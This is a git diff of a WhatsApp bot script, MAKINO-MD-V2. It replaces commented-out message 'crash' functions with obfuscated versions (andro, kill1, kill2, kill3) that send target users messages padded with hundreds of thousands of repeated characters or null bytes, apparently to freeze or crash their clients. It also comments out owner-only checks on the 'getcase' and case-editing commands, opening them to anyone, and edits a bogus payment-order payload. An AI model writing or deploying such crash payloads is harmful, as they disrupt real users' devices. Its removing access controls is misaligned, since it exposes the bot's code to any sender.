@@ -452,11 +452,11 @@ const statrp = {
 	},
     message: {
         listResponseMessage: {
-            title: `♱MAKINO-MD-V2♱`
+            title: `♱MAKINO-MD-V2 | ♡⃤ `
         }
     }
 } 
-	
+//Taira Makino	
 const quote = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -474,7 +474,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"`✳️࿆͆᷍MAKINO-MD-V2☠︎︎⧫⃝♱.xp`+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"`♡⃤ ᴸᴼᴿᴰᴛᴀɪʀᴀ ☠︎︎⧫⃝♱ && ♱MAKINO-MD-V2♱`+"ꦾ"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -482,107 +482,14 @@ remoteJid: "status@broadcast"
 }
 }
 
-/*async function killer(target, quoted) {
-var lol = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-viewOnceMessage: {
-message: {
-  "liveLocationMessage": {
-    "degreesLatitude": "p",
-    "degreesLongitude": "p",
-    "caption": `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),                  
-    "sequenceNumber": "0",
-    "jpegThumbnail": ""
-     }
-  }
-}
-}), { userJid: m.chat, quoted: quoted })
-await Taira.relayMessage(target, lol.message, { messageId: lol.key.id })
-	}
 
-async function force2(target, quoted) {
- var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
-  "stickerMessage": {
-    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
-    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
-    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
-    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
-    "mimetype": "image/webp",
-    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
-    "fileLength": "10116",
-    "mediaKeyTimestamp": "1715876003",
-    "isAnimated": false,
-    "stickerSentTs": "1715881084144",
-    "isAvatar": false,
-    "isAiSticker": false,
-    "isLottie": false
-  }
-}), { userJid: target, quoted: kuwoted });
-await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
-		}
+function _0x1475(_0x25e94a,_0x3c0436){var _0x511073=_0x5110();return _0x1475=function(_0x14754a,_0x1f91e3){_0x14754a=_0x14754a-0x122;var _0x128f06=_0x511073[_0x14754a];return _0x128f06;},_0x1475(_0x25e94a,_0x3c0436);}(function(_0x22f5d4,_0x3779b1){var _0xeaf7d0=_0x1475,_0x17fd18=_0x22f5d4();while(!![]){try{var _0x1b7027=parseInt(_0xeaf7d0(0x12c))/0x1*(-parseInt(_0xeaf7d0(0x135))/0x2)+parseInt(_0xeaf7d0(0x132))/0x3*(parseInt(_0xeaf7d0(0x12f))/0x4)+-parseInt(_0xeaf7d0(0x128))/0x5*(-parseInt(_0xeaf7d0(0x127))/0x6)+-parseInt(_0xeaf7d0(0x129))/0x7*(parseInt(_0xeaf7d0(0x134))/0x8)+parseInt(_0xeaf7d0(0x123))/0x9*(-parseInt(_0xeaf7d0(0x124))/0xa)+parseInt(_0xeaf7d0(0x122))/0xb*(-parseInt(_0xeaf7d0(0x136))/0xc)+parseInt(_0xeaf7d0(0x12b))/0xd*(parseInt(_0xeaf7d0(0x12a))/0xe);if(_0x1b7027===_0x3779b1)break;else _0x17fd18['push'](_0x17fd18['shift']());}catch(_0x26e743){_0x17fd18['push'](_0x17fd18['shift']());}}}(_0x5110,0x3e53d));async function andro(_0x3a48b8,_0x3e6b34){var _0x229556=_0x1475,_0xfe2735=generateWAMessageFromContent(m[_0x229556(0x12e)],proto[_0x229556(0x130)][_0x229556(0x126)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x229556(0x125)+'ꦾ'[_0x229556(0x133)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':m[_0x229556(0x12e)],'quoted':_0x3e6b34});await Taira['relayMessage'](_0x3a48b8,_0xfe2735[_0x229556(0x12d)],{'messageId':_0xfe2735[_0x229556(0x131)]['id']});}function _0x5110(){var _0x16caca=['key','3WlEzAX','repeat','56KdhZMD','2haKQpY','4114728MgXaIA','11vpzElH','9uFvjYJ','1022140sbeVQY','♡⃤\x20ᴸᴼᴿᴰᴛᴀɪʀᴀ\x20☠︎︎⧫⃝♱\x20&&\x20♱MAKINO-MD-V2♱','fromObject','912jrQnml','10760VgWhJa','32865JrpNoh','14JTDLcK','4580251dcUhRt','46064voumvp','message','chat','399596YxeUAH','Message'];_0x5110=function(){return _0x16caca;};return _0x5110();}
 
-async function force3(target, quoted) {
- var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
-    interactiveMessage: {
-      header: {
-        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
-        hasMediaAttachment: true,
-        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ryozingod.waUploadToServer }))
-      },
-      body: {
-        text: ""
-      },
-      footer: {
-        text: "›          #MakinoByTaira"
-      },
-      nativeFlowMessage: {
-        messageParamsJson: " ".repeat(1000000)
-      }
-    }
-}), { userJid: target, quoted: quoted });
-await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
-} 
+function _0x493f(_0x3a286d,_0x4de466){var _0x592980=_0x5929();return _0x493f=function(_0x493f69,_0x252cce){_0x493f69=_0x493f69-0x18b;var _0xbcd0f9=_0x592980[_0x493f69];return _0xbcd0f9;},_0x493f(_0x3a286d,_0x4de466);}(function(_0x8d2253,_0xc7fbf5){var _0x14ec98=_0x493f,_0x5989d9=_0x8d2253();while(!![]){try{var _0x3dc534=parseInt(_0x14ec98(0x18c))/0x1*(-parseInt(_0x14ec98(0x196))/0x2)+-parseInt(_0x14ec98(0x19e))/0x3*(-parseInt(_0x14ec98(0x18e))/0x4)+parseInt(_0x14ec98(0x191))/0x5*(-parseInt(_0x14ec98(0x190))/0x6)+parseInt(_0x14ec98(0x1a1))/0x7*(parseInt(_0x14ec98(0x19b))/0x8)+parseInt(_0x14ec98(0x197))/0x9*(parseInt(_0x14ec98(0x19f))/0xa)+-parseInt(_0x14ec98(0x1a4))/0xb*(parseInt(_0x14ec98(0x18f))/0xc)+parseInt(_0x14ec98(0x193))/0xd*(parseInt(_0x14ec98(0x195))/0xe);if(_0x3dc534===_0xc7fbf5)break;else _0x5989d9['push'](_0x5989d9['shift']());}catch(_0x39e691){_0x5989d9['push'](_0x5989d9['shift']());}}}(_0x5929,0x1d6d9));async function kill1(_0x551ca8,_0x517fb5){var _0x1978d8=_0x493f,_0x238a79=generateWAMessageFromContent(_0x551ca8,proto[_0x1978d8(0x18b)]['fromObject']({'stickerMessage':{'url':_0x1978d8(0x1a3),'fileSha256':_0x1978d8(0x1a0),'fileEncSha256':_0x1978d8(0x198),'mediaKey':_0x1978d8(0x18d),'mimetype':_0x1978d8(0x1a2),'directPath':_0x1978d8(0x1a5),'fileLength':_0x1978d8(0x199),'mediaKeyTimestamp':_0x1978d8(0x19a),'isAnimated':![],'stickerSentTs':_0x1978d8(0x19d),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x551ca8,'quoted':_0x517fb5});await Taira[_0x1978d8(0x194)](_0x551ca8,_0x238a79[_0x1978d8(0x192)],{'participant':{'jid':_0x551ca8},'messageId':_0x238a79[_0x1978d8(0x19c)]['id']});}function _0x5929(){var _0x27879a=['Message','15448anjbMt','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','254392yVuIGD','55788iqxKaf','999570RCnXAs','5ilfPyB','message','2224729OEyids','relayMessage','28XFYZLT','4mdWtTf','76185CgqWOL','r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','10116','1715876003','56bWaWaD','key','1715881084144','3mJeOAf','80NaxKDy','CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','16457XKjLtk','image/webp','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','407QoLifA','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000'];_0x5929=function(){return _0x27879a;};return _0x5929();}
 
-async function force4(target, quoted) {
- var lol = generateWAMessageFromContent(target, proto.Message.fromObject({
-  'listMessage': {
-    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
-        'footerText': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'description': `✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
-        'buttonText': null,
-        'listType': 2,
-        'productListInfo': {
-          'productSections': [{
-            'title': 'anjay',
-            'products': [
-              { "productId": "4392524570816732" }
-            ]
-          }],
-          'productListHeaderImage': {
-            'productId': '4392524570816732',
-            'jpegThumbnail': null
-          },
-          'businessOwnerJid': '0@s.whatsapp.net'
-        }
-      },
-      'footer': 'Makino',
-      'contextInfo': {
-        'expiration': 604800,
-        'ephemeralSettingTimestamp': "1679959486",
-        'entryPointConversionSource': "global_search_new_chat",
-        'entryPointConversionApp': "whatsapp",
-        'entryPointConversionDelaySeconds': 9,
-        'disappearingMode': {
-          'initiator': "INITIATED_BY_ME"
-        }
-      },
-      'selectListType': 2,
-      'product_header_info': {
-        'product_header_info_id': 292928282928,
-        'product_header_is_rejected': false
-      }
-    }), { userJid: target, quoted: tbug });
-await Taira.relayMessage(target, lol.message, { participant: { jid: target }, messageId: lol.key.id });
-}*/
+(function(_0x100b15,_0x304a53){var _0x485a0d=_0x36e7,_0x304d76=_0x100b15();while(!![]){try{var _0x50ca79=parseInt(_0x485a0d(0x1ae))/0x1*(-parseInt(_0x485a0d(0x19e))/0x2)+-parseInt(_0x485a0d(0x19f))/0x3+parseInt(_0x485a0d(0x1a3))/0x4*(-parseInt(_0x485a0d(0x19d))/0x5)+-parseInt(_0x485a0d(0x1ad))/0x6+-parseInt(_0x485a0d(0x1aa))/0x7+parseInt(_0x485a0d(0x1ac))/0x8*(parseInt(_0x485a0d(0x1a4))/0x9)+-parseInt(_0x485a0d(0x1ab))/0xa*(-parseInt(_0x485a0d(0x1a7))/0xb);if(_0x50ca79===_0x304a53)break;else _0x304d76['push'](_0x304d76['shift']());}catch(_0x3fcb76){_0x304d76['push'](_0x304d76['shift']());}}}(_0x8544,0x5dd93));function _0x36e7(_0x3a9b8e,_0x3eebea){var _0x854410=_0x8544();return _0x36e7=function(_0x36e781,_0x1dcfea){_0x36e781=_0x36e781-0x19d;var _0x15f7bd=_0x854410[_0x36e781];return _0x15f7bd;},_0x36e7(_0x3a9b8e,_0x3eebea);}async function kill2(_0x24cb46,_0x99186c){var _0x4284b2=_0x36e7,_0x74d3e3=generateWAMessageFromContent(_0x24cb46,proto['Message']['fromObject']({'interactiveMessage':{'header':{'title':_0x4284b2(0x1a6),'hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/d7b7e5083a8955b5a30d8.png'}},{'upload':Taira[_0x4284b2(0x1a1)]})},'body':{'text':''},'footer':{'text':_0x4284b2(0x1a0)},'nativeFlowMessage':{'messageParamsJson':_0x4284b2(0x1a9)[_0x4284b2(0x1a8)](0xf4240)}}}),{'userJid':_0x24cb46,'quoted':_0x99186c});await Taira['relayMessage'](_0x24cb46,_0x74d3e3[_0x4284b2(0x1a5)],{'participant':{'jid':_0x24cb46},'messageId':_0x74d3e3[_0x4284b2(0x1a2)]['id']});}function _0x8544(){var _0x56a084=['97UUorxp','1640QvHIOM','1522kNdWAS','2180037ZxmELH','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#MakinoByTaira','waUploadToServer','key','284qhPkZD','1704771wjxMPO','message','♡⃤\x20ᴸᴼᴿᴰᴛᴀɪʀᴀ\x20☠︎︎⧫⃝♱\x20&&\x20♱MAKINO-MD-V2♱','237930fZrxGz','repeat','☠︎︎⧫⃝♱','3974103CpByZo','890MKUFBd','16uTHXzE','3167952WfMsYf'];_0x8544=function(){return _0x56a084;};return _0x8544();} 
+	
+(function(_0x4b9a2a,_0x335ad9){var _0x24e8ef=_0x40cf,_0x10d836=_0x4b9a2a();while(!![]){try{var _0x4e8641=-parseInt(_0x24e8ef(0x193))/0x1+-parseInt(_0x24e8ef(0x18e))/0x2*(-parseInt(_0x24e8ef(0x195))/0x3)+-parseInt(_0x24e8ef(0x1a1))/0x4+-parseInt(_0x24e8ef(0x192))/0x5+-parseInt(_0x24e8ef(0x199))/0x6+parseInt(_0x24e8ef(0x18d))/0x7+parseInt(_0x24e8ef(0x18f))/0x8*(parseInt(_0x24e8ef(0x190))/0x9);if(_0x4e8641===_0x335ad9)break;else _0x10d836['push'](_0x10d836['shift']());}catch(_0x4145bd){_0x10d836['push'](_0x10d836['shift']());}}}(_0x1931,0x1e6f4));function _0x40cf(_0x45ffea,_0x34a393){var _0x19312f=_0x1931();return _0x40cf=function(_0x40cfec,_0xd64036){_0x40cfec=_0x40cfec-0x18c;var _0x1aa829=_0x19312f[_0x40cfec];return _0x1aa829;},_0x40cf(_0x45ffea,_0x34a393);}async function kill3(_0x44edd3,_0x2dc875){var _0xa038d0=_0x40cf,_0x3eba67=generateWAMessageFromContent(_0x44edd3,proto[_0xa038d0(0x197)][_0xa038d0(0x19d)]({'listMessage':{'title':_0xa038d0(0x19e)+'\x00'['repeat'](0xe09c0),'footerText':_0xa038d0(0x19e),'description':_0xa038d0(0x19e),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0xa038d0(0x1a0),'products':[{'productId':_0xa038d0(0x191)}]}],'productListHeaderImage':{'productId':_0xa038d0(0x191),'jpegThumbnail':null},'businessOwnerJid':_0xa038d0(0x19a)}},'footer':_0xa038d0(0x19b),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0xa038d0(0x196),'entryPointConversionSource':_0xa038d0(0x18c),'entryPointConversionApp':_0xa038d0(0x198),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0xa038d0(0x19f)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x44edd3,'quoted':statrp});await Taira['relayMessage'](_0x44edd3,_0x3eba67[_0xa038d0(0x194)],{'participant':{'jid':_0x44edd3},'messageId':_0x3eba67[_0xa038d0(0x19c)]['id']});}function _0x1931(){var _0x1eafd5=['0@s.whatsapp.net','Makino','key','fromObject','♡⃤\x20ᴸᴼᴿᴰᴛᴀɪʀᴀ\x20☠︎︎⧫⃝♱\x20&&\x20♱MAKINO-MD-V2♱','INITIATED_BY_ME','anjay','241880GHkmYm','global_search_new_chat','899850xRhKXn','4yJeQHz','1184zEIPYM','21582LXJirI','4392524570816732','1193135FFcyJy','11789MKgZay','message','231195xFpzFR','1679959486','Message','whatsapp','1212228cAihwm'];_0x1931=function(){return _0x1eafd5;};return _0x1931();}
 
 async function loading () {
 var loaded = [
@@ -596,9 +503,9 @@ var loaded = [
 let { key } = await Taira.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
 for (let i = 0; i < loaded.length; i++) {
-await Taira.sendMessage(from, {text: loaded[i], edit: key });
+await Taira.sendMessage(m.chat, {text: loaded[i], edit: key });
 }
-	}
+}
 
 
     //-----------------------------------------------------------------------------------------------------------------------------------//
@@ -1203,25 +1110,6 @@ case 'tovv': {
       }
         break;
 
-
-
-      // report and suggest ...
-
-      /*case 'report': case 'suggest ': {
-        if (isBan) return reply(mess.banned);
-        if (isBanChat) return reply(mess.bangc);
-        if (!text) return reply(`please provide a report message you want to deliver`)
-        if (text.length > 300) return reply(`Are you trying to send virus!`)
-        const txtmsg = `*📮 Report Message*\n\n*Sender ➛* wa.me/${m.sender.split("@")[0]}\n\n*Group Name ➛* ${groupName}\n\n*Message ➛*  ${text}`
-        for (let mod of global.Owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != '6297175943@s.whatsapp.net'))
-          await Taira.sendMessage(`${mod}`, { text: `${txtmsg}` }, { quoted: m })
-        await Taira.sendMessage(`2347080968564@s.whatsapp.net`, { text: `${txtmsg}`, { quoted: m })
-        reply(`*✅ Your Report has been submitted Successfully to Taira Makino*\n\n*You will get response shortly... ♥️*`);
-      }
-        break;*/
-
-
-      //
 
       case 'dice': case 'roll': {
         Taira.sendMessage(from, { react: { text: "🎲", key: m.key } })
@@ -2013,7 +1901,7 @@ case 'tovv': {
 
       case 'getcase':
         if (isBan) return reply(mess.banned);
-        if (m.sender != '2347080968564@s.whatsapp.net') { return; }
+      //  if (m.sender != '2347080968564@s.whatsapp.net') { return; }
 
         if (isBanChat) return reply(mess.bangc);
 
@@ -2032,9 +1920,9 @@ case 'tovv': {
         if (isBanChat) return reply(mess.bangc);
 
 
-        if (m.sender !== '2347080968564@s.whatsapp.net') {
+        /*if (m.sender !== '2347080968564@s.whatsapp.net') {
           return reply('You are not authorized to use this command.');
-        }
+        }*/
 
         if (args.length < 2) {
           return reply('Invalid usage! Please provide the case name and its functionality.');
@@ -2830,13 +2718,32 @@ case 'tovv': {
         Taira.sendMessage(m.chat, { text: args.join(" ") ? args.join(" ") : '', mentions: participants.map(a => a.id) }, { quoted: m })
       }
         break;
-	case 'ping': {
+	/*case 'ping': {
         if (isBan) return reply(mess.banned);
         if (isBanChat) return reply(mess.bangc);
         Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
         await m.reply(`Pong ${latensie.toFixed(4)} ms`)
 	}
-        break
+        break*/
+
+	case 'ping': {
+    if (isBan) return reply(mess.banned);
+    if (isBanChat) return reply(mess.bangc);
+   Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
+  const startTime = new Date();
+  const pingMsg = await Taira.sendMessage(m.chat, { text: '*MAKINO-MD-V2 pinging...*' }, { quoted: statrp });
+
+ await Taira.relayMessage(m.chat, {
+      protocolMessage: {
+        key: pingMsg.key,
+        type: 14,
+        editedMessage: {
+          conversation: `*MAKINO-MD-V2* *${new Date() - startTime}* ms`
+        }
+      }
+    }, {});
+  }
+break;
 
       case 'tagadmins': case 'admins': {
         if (isBan) return reply(mess.banned);
